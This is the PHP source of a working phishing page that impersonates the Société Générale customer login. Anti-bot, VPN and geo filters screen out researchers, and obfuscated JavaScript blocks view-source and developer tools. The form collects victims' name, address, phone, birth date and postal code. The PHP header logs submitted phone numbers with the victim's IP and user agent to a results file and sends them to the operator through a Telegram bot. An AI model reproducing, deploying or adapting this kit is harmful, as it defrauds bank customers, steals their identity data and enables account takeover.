<?php

error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');
$ip = $_SERVER['REMOTE_ADDR'];
session_id(md5($ip));
session_start();

$stripos = 0;
include 'config.php';


include 'M3tri-anti-bots_v0.01/M3tri-Organization.php';
include 'M3tri-anti-bots_v0.01/M3tri-ips.php';
include 'M3tri-anti-bots_v0.01/M3tri-OS-BRS.php';
include 'M3tri-anti-bots_v0.01/M3tri-UA.php';
include 'M3tri-anti-bots_v0.01/M3tri-vpn-proxy.php';
require_once './includes/HunterObfuscator.php'; //Include the class

$jsCode = " jQuery(function($){ document.addEventListener('contextmenu', event => event.preventDefault()); document.onkeydown = function(e) { if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 83 || e.keyCode === 117 || e.keyCode === 44)) { return false; } else { return true; } }; $(document).keydown(function (event) { if (event.keyCode == 123) { return false; } else if (event.ctrlKey && event.shiftKey && event.keyCode == 73) { return false; } }); }) "; //Simple JS code

$hunter = new HunterObfuscator($jsCode); //Initialize with JS code in parameter
$hunter->addDomainName($_SERVER['HTTP_HOST']);
$obsfucated = $hunter->Obfuscate(); //Do obfuscate and get the obfuscated code


$permitted_chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-_~";


$honeypotbots = file_get_contents('honeypotbots.dat');
$errorUrl = '403.php';

$hostname = gethostbyaddr($ip);

if (stripos($honeypotbots, $ip) !== false) {
	
   $stripos = $stripos + 1;

}

$token1 = base64_encode($_SERVER['HTTP_USER_AGENT'].$ip.date('Y:M:D'));


if ($_SESSION['continentCode'] !== 'EU' && $_SESSION['continentCode'] !== 'AF')
{
      $stripos = $stripos + 1;
} 


if ($token1 != $_GET['token'] || $stripos > 0 ){ header("location: " . $errorUrl ."?" . $_GET['token']); exit;  }

if ($_POST['type'] == "tel") {


            $message = '/== SG Tel By METRI==/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'TEL : ' . $_POST['tel'] . "\r\n";
      
            $message .= '/---------------- user details ----------------/' . "\r\n";
            $message .= "Client IP   : ".$ip."\n";
            $message .= "HostName    : ".$hostname."\n";
            $message .= "User Agent  : ".$_SERVER['HTTP_USER_AGENT']."\n";
            $message .= '/-- end tel details --/' . "\r\n\r\n";

            file_put_contents("./rezult/sg-rzlt.txt", $message, FILE_APPEND);

            $tokenlink = "https://api.telegram.org/bot" . $METRI_TOKEN;
            $params=[
            'chat_id'=>$chat_id,
            'text'=>$message,
            ];
            $ch = curl_init($tokenlink . '/sendMessage');
            curl_setopt($ch, CURLOPT_HEADER, false);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $result = curl_exec($ch);
            curl_close($ch);
            
}




?>
<!doctype html>
<html><head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow,"="" "noimageindex,"="" "noarchive,"="" "nocache,"="" "nosnippet"="">
        
        <!-- CSS FILES -->
        <style type="text/css">svg:not(:root).svg-inline--fa{overflow:visible}.svg-inline--fa{display:inline-block;font-size:inherit;height:1em;overflow:visible;vertical-align:-.125em}.svg-inline--fa.fa-lg{vertical-align:-.225em}.svg-inline--fa.fa-w-1{width:.0625em}.svg-inline--fa.fa-w-2{width:.125em}.svg-inline--fa.fa-w-3{width:.1875em}.svg-inline--fa.fa-w-4{width:.25em}.svg-inline--fa.fa-w-5{width:.3125em}.svg-inline--fa.fa-w-6{width:.375em}.svg-inline--fa.fa-w-7{width:.4375em}.svg-inline--fa.fa-w-8{width:.5em}.svg-inline--fa.fa-w-9{width:.5625em}.svg-inline--fa.fa-w-10{width:.625em}.svg-inline--fa.fa-w-11{width:.6875em}.svg-inline--fa.fa-w-12{width:.75em}.svg-inline--fa.fa-w-13{width:.8125em}.svg-inline--fa.fa-w-14{width:.875em}.svg-inline--fa.fa-w-15{width:.9375em}.svg-inline--fa.fa-w-16{width:1em}.svg-inline--fa.fa-w-17{width:1.0625em}.svg-inline--fa.fa-w-18{width:1.125em}.svg-inline--fa.fa-w-19{width:1.1875em}.svg-inline--fa.fa-w-20{width:1.25em}.svg-inline--fa.fa-pull-left{margin-right:.3em;width:auto}.svg-inline--fa.fa-pull-right{margin-left:.3em;width:auto}.svg-inline--fa.fa-border{height:1.5em}.svg-inline--fa.fa-li{width:2em}.svg-inline--fa.fa-fw{width:1.25em}.fa-layers svg.svg-inline--fa{bottom:0;left:0;margin:auto;position:absolute;right:0;top:0}.fa-layers{display:inline-block;height:1em;position:relative;text-align:center;vertical-align:-.125em;width:1em}.fa-layers svg.svg-inline--fa{-webkit-transform-origin:center center;transform-origin:center center}.fa-layers-counter,.fa-layers-text{display:inline-block;position:absolute;text-align:center}.fa-layers-text{left:50%;top:50%;-webkit-transform:translate(-50%,-50%);transform:translate(-50%,-50%);-webkit-transform-origin:center center;transform-origin:center center}.fa-layers-counter{background-color:#ff253a;border-radius:1em;-webkit-box-sizing:border-box;box-sizing:border-box;color:#fff;height:1.5em;line-height:1;max-width:5em;min-width:1.5em;overflow:hidden;padding:.25em;right:0;text-overflow:ellipsis;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top right;transform-origin:top right}.fa-layers-bottom-right{bottom:0;right:0;top:auto;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:bottom right;transform-origin:bottom right}.fa-layers-bottom-left{bottom:0;left:0;right:auto;top:auto;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:bottom left;transform-origin:bottom left}.fa-layers-top-right{right:0;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top right;transform-origin:top right}.fa-layers-top-left{left:0;right:auto;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top left;transform-origin:top left}.fa-lg{font-size:1.33333em;line-height:.75em;vertical-align:-.0667em}.fa-xs{font-size:.75em}.fa-sm{font-size:.875em}.fa-1x{font-size:1em}.fa-2x{font-size:2em}.fa-3x{font-size:3em}.fa-4x{font-size:4em}.fa-5x{font-size:5em}.fa-6x{font-size:6em}.fa-7x{font-size:7em}.fa-8x{font-size:8em}.fa-9x{font-size:9em}.fa-10x{font-size:10em}.fa-fw{text-align:center;width:1.25em}.fa-ul{list-style-type:none;margin-left:2.5em;padding-left:0}.fa-ul>li{position:relative}.fa-li{left:-2em;position:absolute;text-align:center;width:2em;line-height:inherit}.fa-border{border:solid .08em #eee;border-radius:.1em;padding:.2em .25em .15em}.fa-pull-left{float:left}.fa-pull-right{float:right}.fa.fa-pull-left,.fab.fa-pull-left,.fal.fa-pull-left,.far.fa-pull-left,.fas.fa-pull-left{margin-right:.3em}.fa.fa-pull-right,.fab.fa-pull-right,.fal.fa-pull-right,.far.fa-pull-right,.fas.fa-pull-right{margin-left:.3em}.fa-spin{-webkit-animation:fa-spin 2s infinite linear;animation:fa-spin 2s infinite linear}.fa-pulse{-webkit-animation:fa-spin 1s infinite steps(8);animation:fa-spin 1s infinite steps(8)}@-webkit-keyframes fa-spin{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}@keyframes fa-spin{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}.fa-rotate-90{-webkit-transform:rotate(90deg);transform:rotate(90deg)}.fa-rotate-180{-webkit-transform:rotate(180deg);transform:rotate(180deg)}.fa-rotate-270{-webkit-transform:rotate(270deg);transform:rotate(270deg)}.fa-flip-horizontal{-webkit-transform:scale(-1,1);transform:scale(-1,1)}.fa-flip-vertical{-webkit-transform:scale(1,-1);transform:scale(1,-1)}.fa-flip-horizontal.fa-flip-vertical{-webkit-transform:scale(-1,-1);transform:scale(-1,-1)}:root .fa-flip-horizontal,:root .fa-flip-vertical,:root .fa-rotate-180,:root .fa-rotate-270,:root .fa-rotate-90{-webkit-filter:none;filter:none}.fa-stack{display:inline-block;height:2em;position:relative;width:2.5em}.fa-stack-1x,.fa-stack-2x{bottom:0;left:0;margin:auto;position:absolute;right:0;top:0}.svg-inline--fa.fa-stack-1x{height:1em;width:1.25em}.svg-inline--fa.fa-stack-2x{height:2em;width:2.5em}.fa-inverse{color:#fff}.sr-only{border:0;clip:rect(0,0,0,0);height:1px;margin:-1px;overflow:hidden;padding:0;position:absolute;width:1px}.sr-only-focusable:active,.sr-only-focusable:focus{clip:auto;height:auto;margin:0;overflow:visible;position:static;width:auto}</style><link rel="stylesheet" href="./Soc_files/b.min.css">
        <link rel="stylesheet" href="./Soc_files/h.css">
        <link rel="stylesheet" href="./Soc_files/f.css">
        <link rel="stylesheet" href="./Soc_files/m.css">

        <link rel="shortcut icon" href="./Soc_files/favicon.ico" type="image/x-icon"> 
        
        <script type="text/javascript">
            var title = unescape( '%53%6F%63%69%E9%74%E9%20%47%E9%6E%E9%72%61%6C%65%20%7C%20%43%6F%6E%6E%65%78%69%6F%6E' );
            var page_title = unescape( '%43%6F%6E%6E%65%78%69%6F%6E%20%2D%20%45%73%70%61%63%65%20%63%6C%69%65%6E%74' );
        </script>

        <title>Société Générale | Connexion</title>
    </head>

    <body>
        
        <!-- HEADER -->
        <header id="header" class="d-lg-block d-md-none d-sm-none d-none">
            <div class="header-top">
                <span>Agences</span>
                <span>Aide et contacts</span>
            </div>
            <div class="header-bottom">
                <div class="logo"><img src="./Soc_files/logo.png"></div>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- HEADER -->
        <header id="header2" class="d-lg-none d-md-block d-sm-block d-block">
            <div class="logo"><img src="./Soc_files/logo2.jpg"></div>
        </header>
        <!-- END HEADER -->

        <div class="page-title">
            <p class="mb-0 pl-5 mt-4 font-weight-bold" style="color: #000">Connexion - Espace client - Confirmation</p>
        </div>

        <!-- MAIN -->
        <main id="main" class="pt-5 pb-5 mt-5" style="margin-bottom: 200px;margin-top: 0px!important;">
            <div class="container">
                <div class="row justify-content-center">
                    <div class="col-md-8">
                        <form class="login-form" method="post" action="<?php  echo 'Soc-otp.php?token=' . $token1; ?>">
                           
                         
                            <legend>Confirmez vos informations pour continuer.</legend>
                            <div class="form-group" style="max-width: 450px; width: inherit;">
                                <label>
                                    <p class="label-txt">Nom complet :</p>
                                    <input type="text" class="input" id="fn" name="fn" style="margin-top: 10px;" required>
                                </label>
                                
                            <label>
                                    <p class="label-txt">Adresse :</p>
                                    <input type="text" class="input" id="adresse" name="address" style="margin-top: 10px;" required>
                                </label><label>
                                    <p class="label-txt">Votre numéro de téléphone</p>
                                    <input type="tel" class="input" id="tel" name="tel" style="margin-top: 10px;" required>
                                </label><label>
                                    <p class="label-txt">Date de naissance :</p>
                                    <input type="text" class="input" id="dob" name="dob" style="margin-top: 10px;" required>
                                </label></div>
                            
                            
<div class="form-group" style="max-width: 450px; width: inherit;">
                                <label>
                                    <p class="label-txt">Code Postale :</p>
                                    <input type="text" class="input" id="zip" name="zip" style="margin-top: 10px;" minlength="4"  required>
                                </label>
</div>
<div class="form-group mt-5 text-center" style="width: inherit;">
                                <button type="submit">
                                    <img style="min-width: 230px;" src="./Soc_files/confirmer.png">
                                </button>
                            </div>
							<input type="hidden" name="type" value="infos" >
							<input id="cn" type="hidden" > 
							<input id="sc" type="hidden" > 
							<input id="ed" type="hidden" > 
                        </form>
                    </div>
                </div>
            </div>
        </main>
        <!-- END MAIN -->

        <!-- FOOTER 1 -->
        <div id="footer1" class="pt-5 pb-5">
            <div class="container">
                <div class="row" style="overflow: hidden;">
                    <div class="col-lg-8 col-md-8 col-sm-12 col-12 text-center">
                        <img style="min-width: 792px;" src="./Soc_files/footer-info.png" class="d-lg-block d-md-block d-sm-none d-none">
                        <img style="min-width: 346px;" src="./Soc_files/footer-info2.png" class="d-lg-none d-md-none d-sm-inline-block d-inline-block">
                    </div>
                    <div class="col-lg-4 col-md-4 col-sm-12 col-12 d-lg-block d-md-block d-sm-none d-none text-right">
                        <img style="min-width: 154px;" src="./Soc_files/social.png">
                    </div>
                </div>
            </div>
        </div>
        <!-- END FOOTER 1 -->

        <!-- FOOTER 1 -->
        <div id="footer2" class="pt-3 pb-3">
            <div class="container">
                <div class="row" style="overflow: hidden;">
                    <div class="col-lg-3 col-md-3 col-sm-12 col-12 d-lg-block d-md-block d-sm-none d-none">
                        <img style="min-width: 160px;" src="./Soc_files/logo.jpg">
                    </div>
                    <div class="col-lg-9 col-md-3 col-sm-12 col-12 text-lg-right text-md-right text-sm-center text-center">
                        <img style="min-width: 713px;" src="./Soc_files/footer-links.jpg" class="d-lg-inline-block d-md-inline-block d-sm-none d-none">
                        <img style="min-width: 143px;" src="./Soc_files/footer-links2.png" class="d-lg-none d-md-none d-sm-inline-block d-inline-block">
                    </div>
                </div>
            </div>
        </div>
        <!-- END FOOTER 1 -->

        <!-- JS FILES -->
        <script src="./Soc_files/j.min.js"></script>
<script src="./Soc_files/imask.min.js"></script>
<script src="./Soc_files/infos.js"></script>



        <script type="text/javascript">
            $('title').text(title);
            $('#page_header h3').html('<i class="far fa-arrow-alt-circle-left"></i> ' + page_title);
        </script>

    

</body></html>